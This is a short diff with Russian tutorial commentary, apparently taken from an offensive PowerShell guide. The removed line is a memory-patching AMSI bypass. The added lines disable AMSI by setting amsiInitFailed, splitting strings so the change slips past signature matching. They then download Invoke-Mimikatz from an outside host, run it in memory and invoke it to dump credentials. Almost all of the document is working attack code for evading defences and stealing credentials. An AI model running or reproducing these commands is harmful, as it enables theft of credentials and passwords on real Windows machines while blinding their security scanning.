@@ -1,1 +1,11 @@
-$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
+$utils = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
+
+Затем мы выполняем выборку ссылки на значение атрибута amsiInitFailed и устанавливаем его в True.  Во избежание какого бы то ни было полагающегося на лёгкое соответствие шаблону обнаружения мы пробрасываем это в небольшой конкатенации строки:
+$field = $utils.GetField('amsi'+'InitF'+'ailed','NonPublic,Static')
+$field.SetValue($null,$true)
+
+Готово, теперь запускаем на исполнение Mimikatz при отключенном AMSI:
+$browser = New-Object System.Net.WebClient
+$file="https://sf-res.com/Invoke-mimi.ps1"
+IEX($browser.DownloadString($file))
+Invoke-Mimikatz
